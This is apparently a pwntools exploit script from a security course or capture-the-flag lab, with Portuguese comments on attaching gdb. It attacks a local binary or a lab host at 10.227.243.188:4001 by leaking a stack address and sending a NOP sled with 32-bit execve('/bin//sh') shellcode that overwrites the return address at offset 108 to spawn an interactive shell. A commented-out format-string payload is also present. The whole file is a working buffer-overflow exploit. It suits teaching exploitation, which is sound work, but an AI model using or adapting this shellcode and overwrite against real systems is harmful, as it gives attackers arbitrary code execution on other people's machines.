from pwn import *
import sys

# Fill the content with NOP's
content = bytearray(0x90 for i in range(108)) 

LOCAL = True

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("10.227.243.188", 4001)
    
p.recvuntil(b"buffer is ")
f = p.recv(10)

f_value = int(f, 16)

aux_value = 108 + f_value

p.recvuntil(b"input:")
#p.sendline( b"AAAA" + b"\x34\xc0\x04\x08" + b"%.48871x" + b"%n") 





# Replace the content with the actual shellcode
shellcode= (
    "\x31\xc0"    # xorl    %eax,eax
    "\x50"        # pushl    %eax
    "\x68""//sh"  # pushl    $0x68732f2f ??
    "\x68""/bin"  # pushl    $0x6e69622f
    "\x89\xe3"    # movl    %esp, %ebx
    "\x50"        # pushl    %eax
    "\x53"        # pushl    %ebx
    "\x89\xe1"    # movl    %esp, %ecx
    "\x31\xd2"    # xorl    %edx, %edx
    "\xb0\x0b"     # movb    $0xb, %al
    "\xcd\x80"    # int    %x80  
).encode('latin-1')


##################################################################
# Put the shellcode somewhere in the payload
start = 108 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = aux_value           # $ebp + 104 
offset = 108            # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################
print(content)
p.sendline(content) 
p.interactive()
